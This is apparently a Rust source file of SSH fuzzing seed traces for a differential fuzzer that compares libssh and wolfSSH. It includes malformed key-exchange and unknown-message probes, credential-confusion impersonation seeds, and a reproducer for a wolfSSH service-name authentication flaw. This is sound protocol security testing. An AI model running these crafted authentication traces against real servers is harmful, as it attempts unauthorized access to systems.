/// NOT registered in any corpus (diverges by design; callable reproducer only).
pub fn seed_client_attacker_dh_bad_exponent(server: AgentName) -> Trace<SshProtocolTypes> {
    // Client KEXINIT offering ONLY diffie-hellman-group14-sha256 so both stacks
    // negotiate classic modular DH (both advertise it after uniformise).
    let our_kexinit = term! {
        fn_kex_init(
            (fn_placeholder_16bytes),
            (fn_kex_algos((fn_namelist_1((fn_algo_dh_group14_sha256))))),
            (fn_sig_schemes((fn_namelist_2((fn_algo_rsa_sha2_512), (fn_algo_rsa_sha2_256))))),
            (fn_enc_algos((fn_namelist_1((fn_algo_aes256_gcm))))),
            (fn_enc_algos((fn_namelist_1((fn_algo_aes256_gcm))))),
            (fn_mac_algos((fn_namelist_1((fn_algo_hmac_sha2_256))))),
            (fn_mac_algos((fn_namelist_1((fn_algo_hmac_sha2_256))))),
            (fn_comp_algos((fn_namelist_1((fn_algo_none))))),
            (fn_comp_algos((fn_namelist_1((fn_algo_none)))))
        )
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            OutputAction::new_step(server), // KEXINIT
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            // KEXDH_INIT with e = 0 (out of range).
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_dh_init((fn_dh_exponent_zero)))) },
            ),
            OutputAction::new_step(server), // KEXDH_REPLY
        ],
        ..Default::default()
    }
}

/// Item-6 positive control (issue #1047): a password-CHANGE USERAUTH_REQUEST
/// (RFC 4252 §8: boolean TRUE + old-password + new-password) presenting the
/// CORRECT current password, over the same aes256-gcm handshake as
/// `seed_client_attacker_full_aesgcm`. Measured 0-diff: BOTH stacks parse and
/// accept the change-request as ordinary password auth (neither routes it to a
/// distinct password-change handler / SSH_MSG_USERAUTH_PASSWD_CHANGEREQ path).
///
/// REGISTERED in the differential (0-diff) corpus as the LEGIT positive control
/// for the password-change message format: it proves the constructor reaches both
/// stacks' password handlers and gives the mutator a known-good baseline. (That
/// both stacks are equally lax about the change semantics is a shared-conformance
/// observation a *differential* oracle cannot flag.)
pub fn seed_client_attacker_passwd_change(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id =
        term! { fn_banner_id(((server, 0)[Some(SshQueryMatcher::Banner)]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw =
        term! { (server, 0)[Some(SshQueryMatcher::MsgType(31))]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };
    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };

    let svc_req = term! {
        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_auto))
    };
    // password-CHANGE: current password as "old", a new password. change=TRUE.
    let auth_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request((fn_username), (fn_ssh_connection), (fn_method_password),
                                  (fn_password_change_auth_data((fn_password), (fn_password_long))))),
            (@key), (@iv), (fn_u32_auto))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            OutputAction::new_step(server), // KEXINIT
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            OutputAction::new_step(server), // KEX_ECDH_REPLY, NEWKEYS
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            OutputAction::new_step(server), // SERVICE_ACCEPT
            InputAction::new_step(server, term! { @auth_req }),
            OutputAction::new_step(server), // USERAUTH_SUCCESS / FAILURE
        ],
        ..Default::default()
    }
}

/// Item-7 probe (issue #1047): after NEWKEYS, BEFORE authenticating, inject an
/// unknown/high-numbered SSH message (type 250, "reserved for private use") via the
/// new `fn_msg_unknown_highnumber` primitive. RFC 4253 §11.4 says the peer MUST
/// reply SSH_MSG_UNIMPLEMENTED; a lax stack bare-closes. The differential compares
/// the two stacks' handling of an unrecognised pre-auth message, which campaign
/// objectives had only reached incidentally, post-auth.
///
/// NOT registered in any corpus: it diverges by design (kept as a callable
/// reproducer / regression fixture, like `seed_client_attacker_bad_service`). Run
/// `differential-execute libssh0114-asan wolfssh150-asan <trace>` to observe.
pub fn seed_client_attacker_unknown_msg(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id =
        term! { fn_banner_id(((server, 0)[Some(SshQueryMatcher::Banner)]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw =
        term! { (server, 0)[Some(SshQueryMatcher::MsgType(31))]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };
    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };

    // First post-NEWKEYS packet (counter 0): an unknown/high-numbered message.
    let unknown = term! {
        fn_encrypt_packet_aesgcm((fn_msg_unknown_highnumber), (@key), (@iv), (fn_u32_auto))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            OutputAction::new_step(server), // KEXINIT
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            OutputAction::new_step(server), // KEX_ECDH_REPLY, NEWKEYS
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @unknown }),
            OutputAction::new_step(server), // UNIMPLEMENTED
        ],
        ..Default::default()
    }
}

/// MINIMAL REPRODUCER for the USERAUTH service-name divergence (RFC 4252 §5; fixed
/// upstream in wolfSSH 0068d52e). Identical to `seed_client_attacker_pubkey_aesgcm`
/// (authorized user "user" + key A, valid signature) EXCEPT the USERAUTH_REQUEST
/// service-name field is `"ssh-userauth"` instead of `"ssh-connection"` — changed
/// in BOTH the request and the signed blob, so the signature is valid over the
/// bogus service. libssh 0.11.4 rejects it (`messages.c:819` strict
/// `strcmp(service,"ssh-connection")`); wolfSSH accepts it (`internal.c:8352`
/// parses but never validates the service). This isolates the fuzzer-found class
/// (3 fuzzer traces mutated this same field to 3 different garbage values) to a
/// single deliberate change, as a permanent regression fixture.
///
/// NOT registered in any corpus (see the NOTE in `create_corpus`): it is a
/// NON-LEGIT trace that diverges by design, kept only as a callable reproducer for
/// the finding. `#![allow(dead_code)]` (ssh/mod.rs) permits the unregistered
/// `pub fn`. To reproduce: call this, run `differential-execute libssh0114-asan
/// wolfssh150-asan <trace>` — wolfSSH yields UserAuthSuccess, libssh UserAuthFailure.
pub fn seed_client_attacker_bad_service(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id =
        term! { fn_banner_id(((server, 0)[Some(SshQueryMatcher::Banner)]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw =
        term! { (server, 0)[Some(SshQueryMatcher::MsgType(31))]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };
    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };

    let svc_req = term! {
        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_auto))
    };
    // The ONLY change vs the honest pubkey seed: service = fn_ssh_userauth
    // ("ssh-userauth") instead of fn_ssh_connection — signed AND sent, so the
    // signature is valid over the wrong service name.
    let sig = term! {
        fn_sign_userauth((fn_session_id_from_hash((@exch_hash))), (fn_username), (fn_ssh_userauth), (fn_client_a_pubkey_blob))
    };
    let auth_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request(
                (fn_username),
                (fn_ssh_userauth),
                (fn_method_publickey),
                (fn_publickey_auth_data((fn_client_a_pubkey_blob), (@sig)))
            )),
            (@key), (@iv), (fn_u32_auto))
    };
    let chan_open = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_open((fn_channel_session), (fn_channel_id_0), (fn_window_size_default), (fn_max_packet_size_default),
                             (fn_empty_bytes_vec))),
            (@key), (@iv), (fn_u32_auto))
    };
    let chan_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_request((fn_channel_id_0), (fn_channel_exec), (fn_true),
                                (fn_exec_payload((fn_exec_command_userauth))))),
            (@key), (@iv), (fn_u32_auto))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            OutputAction::new_step(server), // KEXINIT
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            OutputAction::new_step(server), // KEX_ECDH_REPLY, NEWKEYS
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            OutputAction::new_step(server), // SERVICE_ACCEPT
            InputAction::new_step(server, term! { @auth_req }),
            OutputAction::new_step(server), // USERAUTH_SUCCESS / FAILURE
            InputAction::new_step(server, term! { @chan_open }),
            OutputAction::new_step(server), // CHANNEL_OPEN_CONFIRMATION
            InputAction::new_step(server, term! { @chan_req }),
            OutputAction::new_step(server), // CHANNEL_SUCCESS
        ],
        ..Default::default()
    }
}

pub fn seed_client_attacker_pubkey_aesgcm(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id =
        term! { fn_banner_id(((server, 0)[Some(SshQueryMatcher::Banner)]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw =
        term! { (server, 0)[Some(SshQueryMatcher::MsgType(31))]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };

    let svc_req = term! {
        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_auto))
    };
    let sig = term! {
        fn_sign_userauth((fn_session_id_from_hash((@exch_hash))), (fn_username), (fn_ssh_connection), (fn_client_a_pubkey_blob))
    };
    let auth_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request(
                (fn_username),
                (fn_ssh_connection),
                (fn_method_publickey),
                (fn_publickey_auth_data((fn_client_a_pubkey_blob), (@sig)))
            )),
            (@key), (@iv), (fn_u32_auto))
    };
    // Channel traffic after auth — also pumps extra progress() iterations, which
    // wolfSSH's single-step accept() needs to finish processing the auth.
    let chan_open = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_open((fn_channel_session), (fn_channel_id_0), (fn_window_size_default), (fn_max_packet_size_default),
                             (fn_empty_bytes_vec))),
            (@key), (@iv), (fn_u32_auto))
    };
    // The channel the server confirmed (its sender_channel), read from its decrypted
    // CHANNEL_OPEN_CONFIRMATION: the CHANNEL_REQUEST addresses it (RFC 4254 §5.1).
    let key_s2c = term! { fn_derive_aes_key_s2c((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
    let iv_s2c = term! { fn_derive_iv_s2c((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
    let chan = term! { fn_s2c_confirmation_sender_channel(((server, *)/RawSshMessageFlight), (@key_s2c), (@iv_s2c)) };
    let chan_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_request((@chan), (fn_channel_exec), (fn_true),
                                (fn_exec_payload((fn_exec_command_userauth))))),
            (@key), (@iv), (fn_u32_auto))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            OutputAction::new_step(server), // KEXINIT
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            OutputAction::new_step(server), // KEX_ECDH_REPLY, NEWKEYS
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            OutputAction::new_step(server), // SERVICE_ACCEPT
            InputAction::new_step(server, term! { @auth_req }),
            OutputAction::new_step(server), // USERAUTH_SUCCESS / FAILURE
            InputAction::new_step(server, term! { @chan_open }),
            OutputAction::new_step(server), // CHANNEL_OPEN_CONFIRMATION
            InputAction::new_step(server, term! { @chan_req }),
            OutputAction::new_step(server), // CHANNEL_SUCCESS
        ],
        ..Default::default()
    }
}

/// Credential-confusion baseline: authenticate by publickey as identity **B**
/// (user "userb", key B), which the harness allow-list authorizes. Mirrors the
/// key-A publickey seed but with B's username / blob / signature, so it completes
/// the handshake. This is the starting point the fuzzer mutates toward cross-
/// identity attacks (swap B's username/blob/signature for A's or C's).
/// AES-256-GCM, c2s counters: SERVICE_REQUEST 0, USERAUTH_REQUEST 1, channel 2,3.
pub fn seed_client_attacker_pubkey_b(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id =
        term! { fn_banner_id(((server, 0)[Some(SshQueryMatcher::Banner)]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw =
        term! { (server, 0)[Some(SshQueryMatcher::MsgType(31))]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };

    let svc_req = term! {
        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_auto))
    };
    // B signs over (session id, "userb", service, key-B blob) with B's key.
    let sig = term! {
        fn_sign_userauth_b((fn_session_id_from_hash((@exch_hash))), (fn_username_b), (fn_ssh_connection), (fn_client_b_pubkey_blob))
    };
    let auth_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request(
                (fn_username_b), (fn_ssh_connection), (fn_method_publickey),
                (fn_publickey_auth_data((fn_client_b_pubkey_blob), (@sig)))
            )),
            (@key), (@iv), (fn_u32_auto))
    };
    let chan_open = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_open((fn_channel_session), (fn_channel_id_0), (fn_window_size_default), (fn_max_packet_size_default),
                             (fn_empty_bytes_vec))),
            (@key), (@iv), (fn_u32_auto))
    };
    // The channel the server confirmed (its sender_channel), read from its decrypted
    // CHANNEL_OPEN_CONFIRMATION: the CHANNEL_REQUEST addresses it (RFC 4254 §5.1).
    let key_s2c = term! { fn_derive_aes_key_s2c((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
    let iv_s2c = term! { fn_derive_iv_s2c((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
    let chan = term! { fn_s2c_confirmation_sender_channel(((server, *)/RawSshMessageFlight), (@key_s2c), (@iv_s2c)) };
    let chan_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_request((@chan), (fn_channel_exec), (fn_true),
                                (fn_exec_payload((fn_exec_command_userauth))))),
            (@key), (@iv), (fn_u32_auto))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            OutputAction::new_step(server), // KEXINIT
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            OutputAction::new_step(server), // KEX_ECDH_REPLY, NEWKEYS
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            OutputAction::new_step(server), // SERVICE_ACCEPT
            InputAction::new_step(server, term! { @auth_req }),
            OutputAction::new_step(server), // USERAUTH_SUCCESS / FAILURE
            InputAction::new_step(server, term! { @chan_open }),
            OutputAction::new_step(server), // CHANNEL_OPEN_CONFIRMATION
            InputAction::new_step(server, term! { @chan_req }),
            OutputAction::new_step(server), // CHANNEL_SUCCESS
        ],
        ..Default::default()
    }
}

/// Credential-confusion **impersonation** seed: present user **A**'s name ("user")
/// but key **B**, with a cryptographically VALID signature by key B over that very
/// request. The stack's signature check passes (B really signed it), so the only
/// thing standing between the attacker and a session is the (user, key) binding:
/// (user "user", key B) is NOT in the allow-list, so a correct server rejects.
/// A stack that authenticates here — or a cross-vendor accept/reject disagreement —
/// is an impersonation finding. This is the headline credential-confusion case.
pub fn seed_client_attacker_impersonate_a_with_b(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id =
        term! { fn_banner_id(((server, 0)[Some(SshQueryMatcher::Banner)]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw =
        term! { (server, 0)[Some(SshQueryMatcher::MsgType(31))]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };

    let svc_req = term! {
        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_auto))
    };
    // Valid signature by key B, but over a request whose username is "user" (A's
    // name). Signature verifies; the (user "user", key B) pairing is unauthorized.
    let sig = term! {
        fn_sign_userauth_b((fn_session_id_from_hash((@exch_hash))), (fn_username), (fn_ssh_connection), (fn_client_b_pubkey_blob))
    };
    let auth_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request(
                (fn_username), (fn_ssh_connection), (fn_method_publickey),
                (fn_publickey_auth_data((fn_client_b_pubkey_blob), (@sig)))
            )),
            (@key), (@iv), (fn_u32_auto))
    };
    // After a REJECTED auth, pump with SSH_MSG_IGNORE (permitted in any state) so
    // wolfSSH flushes its USERAUTH_FAILURE without hitting "message not allowed
    // before user authentication" (which a channel message would trigger). This
    // keeps the seed differential-clean: both stacks reject identically, so the
    // un-mutated trace is 0-diff and mutations that make one stack ACCEPT the bad
    // pairing surface as a real accept/reject divergence.
    let pump1 = term! {
        fn_encrypt_packet_aesgcm((fn_ignore((fn_ssh_bytes_empty))), (@key), (@iv), (fn_u32_auto))
    };
    let pump2 = term! {
        fn_encrypt_packet_aesgcm((fn_ignore((fn_ssh_bytes_empty))), (@key), (@iv), (fn_u32_auto))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            OutputAction::new_step(server), // KEXINIT
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            OutputAction::new_step(server), // KEX_ECDH_REPLY, NEWKEYS
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            OutputAction::new_step(server), // SERVICE_ACCEPT
            InputAction::new_step(server, term! { @auth_req }),
            OutputAction::new_step(server), // USERAUTH_SUCCESS / FAILURE
            InputAction::new_step(server, term! { @pump1 }),
            InputAction::new_step(server, term! { @pump2 }),
        ],
        ..Default::default()
    }
}

/// Credential-confusion **unauthorized-key** seed: authenticate as identity **C**
/// (user "userc", key C) with a valid signature by key C. Key C is deliberately
/// absent from the allow-list, so a correct server rejects despite the valid
/// signature. A stack that accepts — or a cross-vendor disagreement — is a finding.
pub fn seed_client_attacker_unauthorized_key_c(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id =
        term! { fn_banner_id(((server, 0)[Some(SshQueryMatcher::Banner)]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw =
        term! { (server, 0)[Some(SshQueryMatcher::MsgType(31))]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };

    let svc_req = term! {
        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_auto))
    };
    let sig = term! {
        fn_sign_userauth_c((fn_session_id_from_hash((@exch_hash))), (fn_username_c), (fn_ssh_connection), (fn_client_c_pubkey_blob))
    };
    let auth_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request(
                (fn_username_c), (fn_ssh_connection), (fn_method_publickey),
                (fn_publickey_auth_data((fn_client_c_pubkey_blob), (@sig)))
            )),
            (@key), (@iv), (fn_u32_auto))
    };
    // Pump with SSH_MSG_IGNORE after the rejected auth (see impersonate seed).
    let pump1 = term! {
        fn_encrypt_packet_aesgcm((fn_ignore((fn_ssh_bytes_empty))), (@key), (@iv), (fn_u32_auto))
    };
    let pump2 = term! {
        fn_encrypt_packet_aesgcm((fn_ignore((fn_ssh_bytes_empty))), (@key), (@iv), (fn_u32_auto))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            OutputAction::new_step(server), // KEXINIT
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            OutputAction::new_step(server), // KEX_ECDH_REPLY, NEWKEYS
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            OutputAction::new_step(server), // SERVICE_ACCEPT
            InputAction::new_step(server, term! { @auth_req }),
            OutputAction::new_step(server), // USERAUTH_SUCCESS / FAILURE
            InputAction::new_step(server, term! { @pump1 }),
            InputAction::new_step(server, term! { @pump2 }),
        ],
        ..Default::default()
    }
}

/// Session-layer (RFC 4254 connection protocol) seed: authenticate by publickey
/// (key A, accepted), open a session channel, then drive the full set of channel
/// messages — WINDOW_ADJUST, DATA, EXTENDED_DATA, EOF, CLOSE. The other seeds stop
/// at channel-open / channel-request; this one exercises libssh's channel data /
/// flow-control / teardown handlers, a large code area no other seed reaches.
/// AES-256-GCM, c2s counter = packet index since NewKeys.
pub fn seed_client_attacker_channel_data(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id =
